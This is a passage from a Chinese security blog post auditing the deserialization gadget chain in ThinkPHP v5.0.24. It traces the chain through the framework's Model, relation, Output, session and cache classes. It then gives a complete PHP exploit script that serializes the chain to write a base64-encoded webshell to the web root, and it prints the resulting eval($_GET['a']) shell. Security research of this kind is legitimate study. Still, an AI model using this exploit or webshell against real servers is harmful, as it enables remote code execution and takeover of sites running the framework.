+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">parseName</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$type</span> = <span class="number">0</span>, <span class="variable">$ucfirst</span> = <span class="literal">true</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$type</span>) &#123;</span><br><span class="line">            <span class="variable">$name</span> = <span class="title function_ invoke__">preg_replace_callback</span>(<span class="string">&#x27;/_([a-zA-Z])/&#x27;</span>, function (<span class="variable">$match</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="title function_ invoke__">strtoupper</span>(<span class="variable">$match</span>[<span class="number">1</span>]);</span><br><span class="line">            &#125;, <span class="variable">$name</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$ucfirst</span> ? <span class="title function_ invoke__">ucfirst</span>(<span class="variable">$name</span>) : <span class="title function_ invoke__">lcfirst</span>(<span class="variable">$name</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">strtolower</span>(<span class="title function_ invoke__">trim</span>(<span class="title function_ invoke__">preg_replace</span>(<span class="string">&quot;/[A-Z]/&quot;</span>, <span class="string">&quot;_\\0&quot;</span>, <span class="variable">$name</span>), <span class="string">&quot;_&quot;</span>));</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>parseName()函数只对传进来的$name做了一些大小写替换，没有实质上的过滤操作，因此$name可控，$relation可控    </p>
+<p>$relation可控的前提下我们要满足method_exists()函数就需要我们将relation的值设定为\think\Model拥有的方法，在这里我们选择的是getError()方法。主要是$this-&gt;error可控，这样我们不仅满足了method_exists()函数，还让$modelRelation可控，这样$value也就可控了</p>
+<p><img src="/2024/07/30/hello-world/0-24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20240729202954005.png" alt="image-20240729202954005"></p>
+<p>想要$value可控的前提首先需要满足两个if判断</p>
+<p><img src="/2024/07/30/hello-world/0-24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20240729203148225.png" alt="image-20240729203148225"></p>
+<p>第一个if条件需要满足$modelRelation存在getBindAttr()函数，并且$bindAttr变量由getBindAttr()函数返回值决定，发现OneToOne中存在且OneToOne是Relation类的子类、$this-&gt;bindAttr可控</p>
+<p><img src="/2024/07/30/hello-world/0-24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20240729203456389.png" alt="image-20240729203456389"></p>
+<p>跟进OneToOne.php，发现OneToOne是个抽象类，无法生成实例，发现HasOne类继承了OneToOne类，因此我们可以令$modelRelation的值为HasOne，此时便可满足第一个if条件，由于$this-&gt;bindAttr可控，因此我们也能满足第二个if条件</p>
+<p><img src="/2024/07/30/hello-world/0-24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20240729203741038.png" alt="image-20240729203741038"></p>
+<p>我们继续跟进，发现$attr变量由$bindAttr决定，且$attr变量用于912行的$value-&gt;getAttr()中，因此$value-&gt;getAttr($attr)可控，所以我们可以根据$value-&gt;getAttr($attr)调用__call()方法，此时我们需要寻找能写webshell的__call()方法，在这里选择的是think\console\Output类</p>
+<p><img src="/2024/07/30/hello-world/0-24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20240729204315131.png" alt="image-20240729204315131"></p>
+<p>在这里$method和$this-&gt;styles是可控的，array_unshift()对调用block()方法没有影响，因此我们跟进block()方法</p>
+<p><img src="/2024/07/30/hello-world/0-24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20240729204435558.png" alt="image-20240729204435558"></p>
+<p>继续跟进writeln</p>
+<p><img src="/2024/07/30/hello-world/0-24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20240729204510936.png" alt="image-20240729204510936"></p>
+<p>继续跟进write</p>
+<p><img src="/2024/07/30/hello-world/0-24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20240729204530701.png" alt="image-20240729204530701"></p>
+<p>在这里$this-&gt;handle是可控的，我们寻找能写webshell的write()方法，此次选择了 think\session\driver\Memcache类</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params"><span class="variable">$sessID</span>, <span class="variable">$sessData</span></span>)</span></span><br><span class="line"><span class="function"> </span>&#123;</span><br><span class="line">     <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;handler-&gt;<span class="title function_ invoke__">set</span>(<span class="variable">$this</span>-&gt;config[<span class="string">&#x27;session_name&#x27;</span>] . <span class="variable">$sessID</span>, <span class="variable">$sessData</span>, <span class="variable">$this</span>-&gt;config[<span class="string">&#x27;expire&#x27;</span>]);</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
+
+<p>在这里$this-&gt;handler又是可控的，我们继续寻找能写webshell的set()方法，此次选择了think\cache\driver\File 类，我们可以看到think\cache\driver\File 类的set()方法通过file_put_contents()将$data写进了文件，我们跟入$data和$filename</p>
+<p><img src="/2024/07/30/hello-world/0-24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20240729204921440.png" alt="image-20240729204921440"></p>
+<p>发现$filename的值是由getCacheKey()方法决定的，我们跟进getCacheKey()函数</p>
+<p><img src="/2024/07/30/hello-world/0-24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20240729205011027.png" alt="image-20240729205011027"></p>
+<p>$filename的后缀是写死的，为php，并且文件名的一部分可控，这时如果$data可控的话就可以getshell了。我们跟进$data，发现$data最终是由think\console\Output类的write()方法决定的，$data的值为true</p>
+<p><img src="/2024/07/30/hello-world/0-24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20240729205345533.png" alt="image-20240729205345533"></p>
+<p>虽然能写入php文件但是内容不可控，继续跟进发现</p>
+<p><img src="/2024/07/30/hello-world/0-24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20240729205507539.png" alt="image-20240729205507539"></p>
+<p>尝试跟进setTagItem，这次的$key是可控的，$value由之前的$filename决定，这也意味着我们可以通过setTagItem()再一次的写入php文件进行getshell</p>
+<p><img src="/2024/07/30/hello-world/0-24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20240729205549294.png" alt="image-20240729205549294"></p>
+<p>至此pop链分析完毕。</p>
+<h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">process</span>\<span class="title class_">pipes</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Windows</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$files</span> = [];</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;files = [<span class="keyword">new</span> \think\model\Merge];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">model</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Model</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Merge</span> <span class="keyword">extends</span> <span class="title">Model</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$append</span> = [];</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$error</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;append = [</span><br><span class="line">            <span class="string">&#x27;bb&#x27;</span> =&gt; <span class="string">&#x27;getError&#x27;</span></span><br><span class="line">        ];</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;error = (<span class="keyword">new</span> \think\model\relation\BelongsTo);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Model</span></span>&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">console</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Output</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$styles</span> = [];</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$handle</span> = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;styles = [<span class="string">&#x27;removeWhereField&#x27;</span>];</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;handle = (<span class="keyword">new</span> \think\session\driver\Memcache);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">model</span>\<span class="title class_">relation</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BelongsTo</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$query</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;query = (<span class="keyword">new</span> \think\console\Output);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">session</span>\<span class="title class_">driver</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Memcache</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$handler</span> = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;handler = (<span class="keyword">new</span> \think\cache\driver\Memcached);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">cache</span>\<span class="title class_">driver</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">File</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$tag</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$options</span> = [];</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;tag = <span class="literal">false</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;options = [</span><br><span class="line">            <span class="string">&#x27;expire&#x27;</span>        =&gt; <span class="number">3600</span>,</span><br><span class="line">            <span class="string">&#x27;cache_subdir&#x27;</span>  =&gt; <span class="literal">false</span>,</span><br><span class="line">            <span class="string">&#x27;prefix&#x27;</span>        =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;data_compress&#x27;</span> =&gt; <span class="literal">false</span>,</span><br><span class="line">            <span class="string">&#x27;path&#x27;</span>          =&gt; <span class="string">&#x27;php://filter/convert.base64-decode/resource=./&#x27;</span>,</span><br><span class="line">        ];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Memcached</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$tag</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$options</span> = [];</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$handler</span> = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;tag = <span class="literal">true</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;options = [</span><br><span class="line">            <span class="string">&#x27;expire&#x27;</span>   =&gt; <span class="number">0</span>,</span><br><span class="line">            <span class="string">&#x27;prefix&#x27;</span>   =&gt; <span class="string">&#x27;PD9waHAKZXZhbCgkX0dFVFsnYSddKTsKPz4&#x27;</span>,</span><br><span class="line">        ];</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;handler = (<span class="keyword">new</span> <span class="title class_">File</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> \think\process\pipes\Windows));</span><br></pre></td></tr></table></figure>
+
+<p>会在根目录生成一个shell</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]);</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2024/07/30/hello-world/0-24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20240729212721299.png" alt="image-20240729212721299"></p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://p4tt0n.github.io">P4tt0n</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://p4tt0n.github.io/2024/10/09/ThinkPHP-v5-0-24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">https://p4tt0n.github.io/2024/10/09/ThinkPHP-v5-0-24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://p4tt0n.github.io" target="_blank">P4tt0n's B10g</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">代码审计</a></div><div class="post_share"><div class="social-share" data-image="https://pic.imge.cc/2024/07/30/66a8f95578d49.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/2024/10/09/Nodejs%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/" title="Nodejs沙箱逃逸"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">Nodejs沙箱逃逸</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://pic.imge.cc/2024/07/30/66a8f95578d49.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">P4tt0n</div><div class="author-info__description">徐徐前进！</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">5</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">2</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">1</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/p4tt0n"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#ThinkPHP-v5-0-24"><span class="toc-number">1.</span> <span class="toc-text">ThinkPHP v5.0.24</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-number">1.0.1.</span> <span class="toc-text">环境搭建</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90"><span class="toc-number">1.0.2.</span> <span class="toc-text">反序列化分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#EXP"><span class="toc-number">1.0.3.</span> <span class="toc-text">EXP</span></a></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/10/09/ThinkPHP-v5-0-24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" title="ThinkPHP v5.0.24反序列化代码审计">ThinkPHP v5.0.24反序列化代码审计</a><time datetime="2024-10-09T14:22:19.000Z" title="发表于 2024-10-09 22:22:19">2024-10-09</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/10/09/Nodejs%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/" title="Nodejs沙箱逃逸">Nodejs沙箱逃逸</a><time datetime="2024-10-09T14:03:51.000Z" title="发表于 2024-10-09 22:03:51">2024-10-09</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/10/09/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" title="命令执行">命令执行</a><time datetime="2024-10-09T14:00:08.000Z" title="发表于 2024-10-09 22:00:08">2024-10-09</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/07/31/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BAPHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" title="深入浅出PHP反序列化">深入浅出PHP反序列化</a><time datetime="2024-07-31T12:27:32.000Z" title="发表于 2024-07-31 20:27:32">2024-07-31</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/07/30/hello-world/" title="Hello World">Hello World</a><time datetime="2024-07-29T18:17:17.326Z" title="发表于 2024-07-30 02:17:17">2024-07-30</time></div></div></div></div></div></div></main><footer id="footer" style="background: transparent"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2024 By P4tt0n</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=4.14.0-b3"></script><script src="/js/main.js?v=4.14.0-b3"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.35/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"><script>(() => {
+  const runMermaid = (ele) => {
+    window.loadMermaid = true
+    const theme = document.documentElement.getAttribute('data-theme') === 'dark' ? 'dark' : 'default'
+
+    Array.from(ele).forEach((item, index) => {
+      const mermaidSrc = item.firstElementChild
+      const mermaidThemeConfig = '%%{init:{ \'theme\':\'' + theme + '\'}}%%\n'
+      const mermaidID = 'mermaid-' + index
+      const mermaidDefinition = mermaidThemeConfig + mermaidSrc.textContent
+
+      const renderFn = mermaid.render(mermaidID, mermaidDefinition)
+
+      const renderV10 = () => {
+        renderFn.then(({svg}) => {
+          mermaidSrc.insertAdjacentHTML('afterend', svg)
+        })
+      }
+
+      const renderV9 = svg => {
+        mermaidSrc.insertAdjacentHTML('afterend', svg)
+      }
+
+      typeof renderFn === 'string' ? renderV9(renderFn) : renderV10()
+    })
+  }
+
+  const codeToMermaid = () => {
+    const codeMermaidEle = document.querySelectorAll('pre > code.mermaid')
+    if (codeMermaidEle.length === 0) return
+    
+    codeMermaidEle.forEach(ele => {
+      const newEle = document.createElement('div')
+      newEle.className = 'mermaid-wrap'
+      newEle.innerHTML = `<pre class="mermaid-src" hidden>${ele.textContent}</pre>`
+      ele.parentNode.replaceWith(newEle)
+    })
+  }
+
+  const loadMermaid = () => {
+    if (false) codeToMermaid()
+    const $mermaid = document.querySelectorAll('#article-container .mermaid-wrap')
+    if ($mermaid.length === 0) return
+
+    const runMermaidFn = () => runMermaid($mermaid)
+    btf.addGlobalFn('themeChange', runMermaidFn, 'mermaid')
+    window.loadMermaid ? runMermaidFn() : btf.getScript('https://cdn.jsdelivr.net/npm/mermaid@10.9.0/dist/mermaid.min.js').then(runMermaidFn)
+  }
+  
+  btf.addGlobalFn('encrypt', loadMermaid, 'mermaid')
+  window.pjax ? loadMermaid() : document.addEventListener('DOMContentLoaded', loadMermaid)
+})()</script></div><script id="click-heart" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/dist/click-heart.min.js" async="async" mobile="false"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
